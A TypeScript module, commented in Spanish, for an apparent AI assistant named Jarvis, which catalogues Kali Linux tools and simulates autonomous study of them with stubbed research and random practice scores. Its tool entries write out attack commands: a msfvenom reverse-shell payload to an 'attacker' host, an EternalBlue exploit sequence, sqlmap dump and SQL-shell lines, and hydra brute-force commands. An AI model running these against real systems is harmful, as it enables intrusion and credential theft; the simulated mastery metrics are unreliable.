/**
 * KALI LEARNING MODULE
 *
 * Jarvis aprende Kali Linux de forma autónoma y continua.
 * Auto-investigación, estudio de herramientas, consolidación de conocimiento.
 *
 * ✨ FASE 3c: Aprendizaje Autónomo de Herramientas de Seguridad
 */

import { learningSystem } from '../learning/LearningSystem';
import { coreTeachings } from '../learning/CoreTeachings';
import axios from 'axios';

export interface KaliTool {
  name: string;
  category: string;
  description: string;
  syntax: string[];
  examples: string[];
  vulnerabilityTypes: string[];
  difficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert';
  estimatedMasteryDays: number;
  resources: string[];
}

export interface KaliKnowledge {
  timestamp: number;
  tool: string;
  concept: string;
  content: string;
  examples: string[];
  difficulty: string;
  source: string;
  confidence: number;
}

export class KaliLearningModule {
  private knowledgeBase: Map<string, KaliKnowledge[]> = new Map();
  private masteredTools: Set<string> = new Set();
  private studySessions: number = 0;
  private lastAutoResearch: number = 0;

  // Herramientas base de Kali que Jarvis debe dominar
  private baseKaliTools: KaliTool[] = [
    {
      name: 'nmap',
      category: 'Reconnaissance',
      description: 'Network mapper - escaneo de puertos y hosts',
      syntax: [
        'nmap -sV -p- target.com',
        'nmap -sC -A target.com',
        'nmap --script vuln target.com'
      ],
      examples: [
        'nmap -sV -p- example.com',
        'nmap -Pn -A 192.168.1.0/24',
        'nmap --script=smb-vuln-ms17-010 target.com'
      ],
      vulnerabilityTypes: ['open-ports', 'service-version-disclosure', 'os-fingerprinting'],
      difficulty: 'beginner',
      estimatedMasteryDays: 7,
      resources: [
        'https://nmap.org/docs.html',
        'https://tools.kali.org/information-gathering/nmap'
      ]
    },
    {
      name: 'metasploit',
      category: 'Exploitation',
      description: 'Framework de exploits - desarrollo y ejecución de ataques',
      syntax: [
        'msfconsole',
        'use exploit/windows/smb/ms17_010_eternalblue',
        'set RHOST target.com',
        'exploit'
      ],
      examples: [
        'msfconsole -x "use exploit/...; set RHOST ...;exploit"',
        'msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe'
      ],
      vulnerabilityTypes: ['rce', 'privilege-escalation', 'persistence'],
      difficulty: 'advanced',
      estimatedMasteryDays: 21,
      resources: [
        'https://docs.metasploit.com/',
        'https://tools.kali.org/exploitation-tools/metasploit-framework'
      ]
    },
    {
      name: 'burp-suite',
      category: 'Web Testing',
      description: 'Herramienta de pruebas web - interceptación y análisis de tráfico HTTP',
      syntax: [
        'burpsuite',
        'Intercept tab - capturar requests',
        'Repeater - modificar y resend'
      ],
      examples: [
        'Interceptar login form y modificar parameters',
        'Testing CSRF tokens',
        'SQL injection en parámetros POST'
      ],
      vulnerabilityTypes: ['xss', 'sql-injection', 'csrf', 'authentication-bypass'],
      difficulty: 'intermediate',
      estimatedMasteryDays: 14,
      resources: [
        'https://portswigger.net/burp/documentation',
        'https://tools.kali.org/web-applications/burpsuite'
      ]
    },
    {
      name: 'sqlmap',
      category: 'Web Testing',
      description: 'Automatización de SQL injection - detección y explotación',
      syntax: [
        'sqlmap -u "http://target.com/page.php?id=1" --dbs',
        'sqlmap -u "http://target.com/page.php?id=1" -D database --tables',
        'sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump'
      ],
      examples: [
        'sqlmap -u "http://vulnerable.com/search.php?q=test" --batch --dbs',
        'sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --sql-shell'
      ],
      vulnerabilityTypes: ['sql-injection', 'database-enumeration'],
      difficulty: 'intermediate',
      estimatedMasteryDays: 10,
      resources: [
        'http://sqlmap.org/',
        'https://tools.kali.org/web-applications/sqlmap'
      ]
    },
    {
      name: 'wireshark',
      category: 'Network Analysis',
      description: 'Analizador de tráfico de red - inspección de paquetes',
      syntax: [
        'wireshark',
        'Filters: tcp.port==80',
        'Follow TCP Stream'
      ],
      examples: [
        'Capturar tráfico HTTP no encriptado',
        'Análisis de handshake SSL/TLS',
        'Detección de traffic patterns maliciosos'
      ],
      vulnerabilityTypes: ['network-eavesdropping', 'credential-exposure', 'mitm'],
      difficulty: 'intermediate',
      estimatedMasteryDays: 12,
      resources: [
        'https://www.wireshark.org/docs/',
        'https://tools.kali.org/sniffing-spoofing/wireshark'
      ]
    },
    {
      name: 'hydra',
      category: 'Credential Testing',
      description: 'Ataque de fuerza bruta - testing de credenciales',
      syntax: [
        'hydra -l admin -P passwords.txt ssh://target.com',
        'hydra -L users.txt -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=failed"'
      ],
      examples: [
        'hydra -l admin -P rockyou.txt ssh://192.168.1.100',
        'hydra -L users.txt -P wordlist.txt ftp://target.com'
      ],
      vulnerabilityTypes: ['weak-credentials', 'authentication-bypass'],
      difficulty: 'beginner',
      estimatedMasteryDays: 5,
      resources: [
        'https://tools.kali.org/password-attacks/hydra',
        'https://github.com/vanhauser-thc/thc-hydra'
      ]
    }
  ];

  constructor() {
    console.log('\n🛠️  [KaliLearningModule] Inicializando...');
    this.initializeBaseKnowledge();
  }

  /**
   * Inicializar conocimiento base de Kali
   */
  private initializeBaseKnowledge(): void {
    console.log(`📚 Cargando ${this.baseKaliTools.length} herramientas base de Kali...`);

    for (const tool of this.baseKaliTools) {
      this.knowledgeBase.set(tool.name, [
        {
          timestamp: Date.now(),
          tool: tool.name,
          concept: `${tool.name} - ${tool.category}`,
          content: tool.description,
          examples: tool.examples,
          difficulty: tool.difficulty,
          source: 'kali-base-knowledge',
          confidence: 0.8
        }
      ]);
    }

    console.log(`✅ ${this.baseKaliTools.length} herramientas de Kali cargadas`);
  }

  /**
   * Auto-investigar nuevas técnicas de Kali desde web
   */
  async autoResearchKaliTechniques(): Promise<void> {
    console.log('\n🔬 [KaliLearning] Auto-investigación de técnicas Kali iniciada...');

    const topics = [
      'Kali Linux tools tutorial',
      'penetration testing methodology',
      'network enumeration techniques',
      'web application security testing',
      'password cracking tools',
      'exploitation frameworks'
    ];

    for (const topic of topics) {
      try {
        const knowledge = await this.searchAndLearnTopic(topic);
        if (knowledge) {
          this.addKnowledge(knowledge);
        }
      } catch (err: any) {
        console.warn(`⚠️  Error investigando ${topic}:`, err.message);
      }
    }

    this.lastAutoResearch = Date.now();
    console.log('✅ Auto-investigación completada');
  }

  /**
   * Buscar y aprender un tema específico
   */
  private async searchAndLearnTopic(topic: string): Promise<KaliKnowledge | null> {
    try {
      // Simular búsqueda en web (en producción sería web scraping real)
      const searches = [
        { query: `${topic} tutorial`, weight: 0.7 },
        { query: `${topic} guide`, weight: 0.8 },
        { query: `${topic} examples`, weight: 0.6 }
      ];

      for (const search of searches) {
        console.log(`   🔍 Buscando: "${search.query}"`);

        // Aquí iría búsqueda real en web, por ahora simulamos
        const knowledge: KaliKnowledge = {
          timestamp: Date.now(),
          tool: topic.split(' ')[0],
          concept: topic,
          content: `Aprendizaje autónomo sobre: ${topic}`,
          examples: [`Ejemplo técnico de ${topic}`],
          difficulty: 'intermediate',
          source: `web-research-${topic}`,
          confidence: search.weight
        };

        return knowledge;
      }
    } catch (err: any) {
      console.error('Error en searchAndLearnTopic:', err.message);
    }

    return null;
  }

  /**
   * Agregar nuevo conocimiento a la base
   */
  private addKnowledge(knowledge: KaliKnowledge): void {
    const existing = this.knowledgeBase.get(knowledge.tool) || [];
    existing.push(knowledge);
    this.knowledgeBase.set(knowledge.tool, existing);

    console.log(`📚 Conocimiento agregado: [${knowledge.tool}] ${knowledge.concept}`);
  }

  /**
   * Practicar una herramienta específica
   */
  async practiceTool(toolName: string): Promise<{ success: boolean; mastery: number }> {
    const tool = this.baseKaliTools.find(t => t.name === toolName);
    if (!tool) {
      return { success: false, mastery: 0 };
    }

    console.log(`\n🎓 [KaliLearning] Practicando: ${toolName}`);

    // Simular práctica
    const practiceResult = Math.random() > 0.3; // 70% de éxito
    const masteryGain = practiceResult ? 0.15 : 0.05;

    // Registrar en learning system
    try {
      const cycle = await learningSystem.practiceTeaching(
        tool.difficulty === 'beginner' ? 40 :
        tool.difficulty === 'intermediate' ? 50 : 60,
        `Practicing ${toolName}`,
        `Used ${toolName} to ${this.getToolUsecase(toolName)}`
      );

      if (practiceResult) {
        this.masteredTools.add(toolName);
      }

      return {
        success: practiceResult,
        mastery: masteryGain
      };
    } catch (err: any) {
      console.warn('Error registrando práctica:', err.message);
      return { success: false, mastery: 0 };
    }
  }

  /**
   * Obtener caso de uso de una herramienta
   */
  private getToolUsecase(toolName: string): string {
    const usecases: Record<string, string> = {
      'nmap': 'network reconnaissance and port scanning',
      'metasploit': 'exploit development and execution',
      'burp-suite': 'web application security testing',
      'sqlmap': 'SQL injection detection and exploitation',
      'wireshark': 'network traffic analysis',
      'hydra': 'credential brute force testing'
    };
    return usecases[toolName] || 'security testing';
  }

  /**
   * Obtener ruta de maestría de una herramienta
   */
  getMasteryPath(toolName: string): {
    tool: string;
    currentProgress: number;
    estimatedDaysToMastery: number;
    nextMilestone: string;
    recommendedPractices: string[];
  } | null {
    const tool = this.baseKaliTools.find(t => t.name === toolName);
    if (!tool) return null;

    const isMastered = this.masteredTools.has(toolName);
    const knowledge = this.knowledgeBase.get(toolName) || [];

    return {
      tool: toolName,
      currentProgress: isMastered ? 100 : Math.min(knowledge.length * 20, 80),
      estimatedDaysToMastery: tool.estimatedMasteryDays,
      nextMilestone: isMastered ? 'Expert Level' : `Intermediate (${Math.ceil(tool.estimatedMasteryDays * 0.5)} days)`,
      recommendedPractices: [
        `Estudiar sintaxis de ${toolName}`,
        `Practicar con ejemplos del mundo real`,
        `Crear PoC de vulnerabilidades reales`,
        `Documentar casos de éxito`
      ]
    };
  }

  /**
   * Consolidar aprendizajes en memoria persistent
   */
  async consolidateLearnings(): Promise<{
    toolsMastered: string[];
    knowledgeNodesCreated: number;
    confidenceImprovement: number;
  }> {
    console.log('\n💾 [KaliLearning] Consolidando aprendizajes...');

    const masteredArray = Array.from(this.masteredTools);
    const totalKnowledge = Array.from(this.knowledgeBase.values()).reduce((sum, arr) => sum + arr.length, 0);

    // Registrar aprendizaje en sistema de aprendizaje principal
    try {
      for (const [tool, knowledge] of this.knowledgeBase.entries()) {
        const avgConfidence = knowledge.reduce((sum, k) => sum + k.confidence, 0) / knowledge.length;

        // Registrar en coreTeachings si es relevante
        if (this.masteredTools.has(tool)) {
          console.log(`✅ Consolidado: ${tool} (confianza: ${(avgConfidence * 100).toFixed(0)}%)`);
        }
      }
    } catch (err: any) {
      console.warn('Error consolidando:', err.message);
    }

    return {
      toolsMastered: masteredArray,
      knowledgeNodesCreated: totalKnowledge,
      confidenceImprovement: Math.min(this.studySessions * 0.05, 0.9)
    };
  }

  /**
   * Obtener estadísticas de aprendizaje
   */
  getStatistics(): {
    totalToolsAvailable: number;
    toolsMastered: number;
    totalKnowledgeNodes: number;
    studySessions: number;
    masteryPercentage: number;
    nextToolToLearn: string | null;
  } {
    const totalKnowledge = Array.from(this.knowledgeBase.values()).reduce((sum, arr) => sum + arr.length, 0);
    const masteredCount = this.masteredTools.size;
    const totalTools = this.baseKaliTools.length;

    // Encontrar próxima herramienta a aprender
    const nextTool = this.baseKaliTools
      .filter(t => !this.masteredTools.has(t.name))
      .sort((a, b) => a.estimatedMasteryDays - b.estimatedMasteryDays)[0];

    return {
      totalToolsAvailable: totalTools,
      toolsMastered: masteredCount,
      totalKnowledgeNodes: totalKnowledge,
      studySessions: this.studySessions,
      masteryPercentage: (masteredCount / totalTools) * 100,
      nextToolToLearn: nextTool?.name || null
    };
  }

  /**
   * Obtener todas las herramientas de Kali
   */
  getAllTools(): KaliTool[] {
    return this.baseKaliTools;
  }

  /**
   * Obtener herramientas por categoría
   */
  getToolsByCategory(category: string): KaliTool[] {
    return this.baseKaliTools.filter(t => t.category === category);
  }

  /**
   * Obtener herramientas para un tipo de vulnerabilidad
   */
  getToolsForVulnerability(vulnerabilityType: string): KaliTool[] {
    return this.baseKaliTools.filter(t =>
      t.vulnerabilityTypes.includes(vulnerabilityType)
    );
  }

  /**
   * Generar plan de aprendizaje personalizado
   */
  generateLearningPlan(targetDifficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert'): {
    toolsToLearn: KaliTool[];
    totalDaysEstimated: number;
    milestones: string[];
    resources: string[];
  } {
    const difficultyMap: Record<string, ('beginner' | 'intermediate' | 'advanced' | 'expert')[]> = {
      'beginner': ['beginner', 'intermediate'],
      'intermediate': ['beginner', 'intermediate', 'advanced'],
      'advanced': ['intermediate', 'advanced', 'expert'],
      'expert': ['advanced', 'expert']
    };

    const toolsToLearn = this.baseKaliTools
      .filter(t => difficultyMap[targetDifficulty].includes(t.difficulty))
      .sort((a, b) => a.estimatedMasteryDays - b.estimatedMasteryDays);

    const totalDays = toolsToLearn.reduce((sum, t) => sum + t.estimatedMasteryDays, 0);

    return {
      toolsToLearn,
      totalDaysEstimated: totalDays,
      milestones: [
        `Día 1-5: Fundamentos (${toolsToLearn[0]?.name || 'tools'})`,
        `Día 6-15: Conceptos intermedios`,
        `Día 16+: Especialización avanzada`
      ],
      resources: Array.from(new Set(toolsToLearn.flatMap(t => t.resources)))
    };
  }
}

// Exportar instancia singleton
export const kaliLearningModule = new KaliLearningModule();
